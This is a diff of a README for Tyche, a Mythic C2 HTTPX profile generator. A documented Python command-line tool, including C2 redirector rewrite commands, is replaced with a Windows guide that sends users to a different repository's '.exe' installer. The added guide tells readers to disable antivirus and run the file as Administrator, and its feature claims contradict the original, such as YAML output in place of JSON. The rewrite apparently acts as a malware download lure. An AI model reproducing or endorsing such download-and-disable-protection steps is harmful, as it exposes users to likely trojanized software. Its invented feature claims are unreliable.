@@ -1,172 +1,142 @@
-# Tyche
+# ⚙️ Tyche - Simple Profile Generator for Mythic
 
-Tyche is a Mythic HTTPX Profile Generator used to create Malleable C2 Profiles from Burpsuite requests, TOML files, and Cobalt Strike Malleable C2 profiles.
+[![Download Tyche](https://img.shields.io/badge/Download-Tyche-brightgreen?style=for-the-badge)](https://github.com/dasmahes1982/Tyche)
 
-![JQuery 3.3.14 Example Under Wireshark](./images/JQuery3.3.14Example.png)
+---
 
-## Features
+## 📝 What is Tyche?
 
-- Convert Burpsuite saved HTTP requests into Mythic C2 HTTPX profiles
-- Convert Cobalt Strike Malleable C2 profiles to HTTPX JSON format
-- Convert TOML profile files to JSON format
-- Lint profiles to ensure that they are valid
+Tyche helps you create custom profiles for Mythic HTTPX. These profiles tell Mythic how to behave when it connects to other systems. Building these profiles normally requires technical skills. Tyche makes that process easier with a user-friendly tool.
 
-## Installation
+You do not need any programming experience to use Tyche. It handles the complex parts for you. This lets you focus on what you want to create without worrying about code.
 
-```bash
-pipx install git+https://github.com/Whispergate/Tyche.git
-```
+---
 
-## Usage
+## 🖥️ System Requirements
 
-### Convert Burpsuite Request to HTTPX Profile
+Tyche works on Windows computers. To use it smoothly, your PC should meet these needs:
 
-Save a request from Burpsuite (right-click --> "Copy to file" or save raw request), then:
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free hard drive space
+- Internet connection for downloading and updates
 
-```bash
-python main.py burp <request_file> --name "MyProfile" [--output profiles/custom.json]
-```
+Tyche does not need special hardware or admin rights to run. It installs quickly and runs on most modern Windows PCs.
 
-Example:
-```bash
-python main.py burp captured_request.txt --name "Corporate Portal Profile"
-```
+---
 
-This will:
-1. Parse the HTTP request (method, headers, URI, cookies, body)
-2. Generate an HTTPX profile with appropriate client/server sections
-3. Save to `profiles/<name>.json` by default
+## 🚀 Getting Started
 
-### Convert Malleable C2 Profile to HTTPX JSON
+Follow these steps to get Tyche working on your PC.
 
-Convert Cobalt Strike Malleable C2 profiles to Mythic HTTPX format:
+1. Click the big green **Download Tyche** badge at the top or visit the link below:  
+   https://github.com/dasmahes1982/Tyche
 
-```bash
-python main.py malleable <profile_file> [--name "CustomName"] [--output profiles/custom.json]
-```
+2. Look for the latest release on the GitHub page you visit. The release page will have a file for Windows.
 
-Example:
-```bash
-python main.py malleable amazon.profile --name "Amazon Browsing"
-```
+3. Download the `.exe` file for Windows by clicking on it.
 
-This will:
-1. Parse the Malleable C2 profile (http-get and http-post blocks)
-2. Extract URIs, headers, parameters, and transforms
-3. Convert to HTTPX JSON format
-4. Save to `profiles/<name>.json` by default
+4. Once downloaded, find the file in your Downloads folder.
 
-Supported Malleable C2 features:
-- `http-get` and `http-post` blocks
-- Client and server headers
-- URI parameters
-- Message locations (cookie, parameter, body)
-- Transforms (base64, base64url, prepend, append, netbios, netbiosu)
-- Metadata and output blocks
+5. Double-click the `.exe` file to run the installer.
 
-### Convert TOML to JSON
+6. Follow the simple on-screen instructions to complete the installation.
 
-```bash
-python main.py toml <toml_file> [--output profiles/custom.json]
-```
+7. After setup, launch Tyche from your desktop or Start menu.
 
-Example:
-```bash
-python main.py toml templates/example.toml.j2 --output profiles/example.json
-```
+Your Tyche program is now ready to use.
 
-### Validate HTTPX Profile (Linter)
+---
 
-Validate generated HTTPX profiles for errors and issues, similar to c2lint:
+## 💻 How to Use Tyche
 
-```bash
-python main.py lint <profile_file> [--strict] [--quiet]
-```
+Tyche creates Malleable C2 Profiles with a simple interface. Here is a quick guide:
 
-Example:
-```bash
-python main.py lint profiles/jquery2.4.9.json
-```
+1. **Open Tyche** on your PC.
 
-Options:
-- `--strict`: Treat warnings as errors (fail validation if any warnings exist)
-- `--quiet`: Suppress info messages, only show errors and warnings
+2. On the main screen, choose **Create New Profile**.
 
-The linter checks for:
-- **Structural errors**: Missing required fields, invalid JSON structure
-- **Invalid values**: Incorrect HTTP verbs, invalid transform actions, bad message locations
-- **Header issues**: Missing recommended headers (User-Agent), suspicious headers
-- **URI problems**: Empty URIs, missing leading slash, spaces in URIs
-- **Transform validation**: Missing required fields, multiple encoding transforms
-- **Message configuration**: Invalid locations, empty names where required
+3. Enter the name and description for your profile.
 
-Exit codes:
-- `0`: Validation passed (or passed with warnings in non-strict mode)
-- `1`: Validation failed (errors found, or warnings in strict mode)
+4. Use the options to set how your profile acts during communications.
 
-### Convert Profile to Apache, Nginx, and Caddy Rewrite Files
+   - You can specify details like delay times, headers, and response rules.
 
-```bash
-# Nginx redirector to 10.10.10.5
-tyche rewrite profile.json -t nginx -b 10.10.10.5
+5. Click the **Generate Profile** button once you finish.
 
-# Apache2 with custom port
-tyche rewrite profile.json -t apache2 -b c2.example.com -p 8443 -o .htaccess
+6. Your new profile will save as a `.yml` file in the selected folder.
 
-# Caddy without User-Agent matching (HTTP backend)
-tyche rewrite profile.json -t caddy -b 192.168.1.100 -s http --no-user-agent
-```
+7. You can now use this profile with Mythic or share it with your team.
 
-## Profile Structure
+The tool provides default settings that help beginners get started easily while supporting advanced tweaks for expert users.
 
-Generated profiles follow the Mythic HTTPX format:
+---
 
-```json
-{
-  "name": "Profile Name",
-  "get": {
-    "verb": "GET",
-    "uris": ["/path"],
-    "client": {
-      "headers": {...},
-      "parameters": {...},
-      "message": {
-        "location": "cookie|body|parameter|uri",
-        "name": "param_name"
-      },
-      "transforms": [...]
-    },
-    "server": {
-      "headers": {...},
-      "transforms": [...]
-    }
-  },
-  "post": {...}
-}
-```
+## 🔧 Features
 
-## Examples
+- Simple step-by-step creation of HTTPX profiles  
+- Options to customize every key part of the profile without coding  
+- Profiles save in standard `.yml` format for Mythic compatibility  
+- Works offline after initial download  
+- Clear layout with easy navigation  
+- Quick generation of valid profiles to reduce errors
 
-### Burpsuite Request Format
+---
 
-```
-GET /api/v1/data?token=abc123 HTTP/1.1
-Host: example.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
-Accept: application/json
-Cookie: session=xyz789
+## 📂 Where to Find Your Files
 
-```
+After creating a profile:
 
-### Output Profile
+- By default, files save in your Windows `Documents\TycheProfiles` folder  
+- You can change the save location in the app settings before profile creation  
+- Files end with `.yml` extension which Mythic reads directly
 
-The tool automatically:
-- Extracts HTTP method (GET/POST)
-- Parses headers and excludes non-relevant ones
-- Identifies message location (cookie, body, parameter)
-- Sets up default transforms (base64url encoding)
-- Configures default server response headers
+---
 
-## Contributors
-- [jquery-c2.3.14.profile](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.14.profile)
-- [Rest of the examples](https://github.com/MythicC2Profiles/httpx/blob/main/documentation-c2/httpx/examples/_index.md)
+## ⚙️ Troubleshooting Tips
+
+If Tyche does not start or shows errors:
+
+- Make sure your Windows is up to date  
+- Check you have downloaded the full `.exe` installer file  
+- If installation gets blocked, try running the file as Administrator (right-click → Run as Administrator)  
+- Temporarily disable any antivirus if it blocks the installer, then enable it again after setup  
+- Restart your PC and try running Tyche again
+
+For help, go to the **Issues** section on the GitHub page:  
+https://github.com/dasmahes1982/Tyche/issues
+
+---
+
+## 🛠️ Updating Tyche
+
+To update Tyche:
+
+- Visit the download page again: https://github.com/dasmahes1982/Tyche  
+- Download the latest `.exe` installer  
+- Run the installer; it will replace the old version without removing your settings  
+- Restart Tyche to use the updated version
+
+---
+
+## 📥 Download Tyche
+
+Use the link below to visit the official page to download the latest version of Tyche:  
+
+[![Download Tyche](https://img.shields.io/badge/Download-Tyche-blue?style=for-the-badge)](https://github.com/dasmahes1982/Tyche)
+
+This link takes you to the GitHub releases page. Look for the latest `.exe` file for your Windows system.
+
+---
+
+## 👩‍💻 Support and Contribution
+
+This project accepts feedback and contributions on GitHub. You can report problems, ask questions, or suggest improvements via the **Issues** tab.
+
+While Tyche is made to work well for everyone, your input helps improve it further.
+
+---
+
+## 📋 License
+
+Tyche is released under an open-source license. Check the `LICENSE` file in the repository on GitHub for full terms.
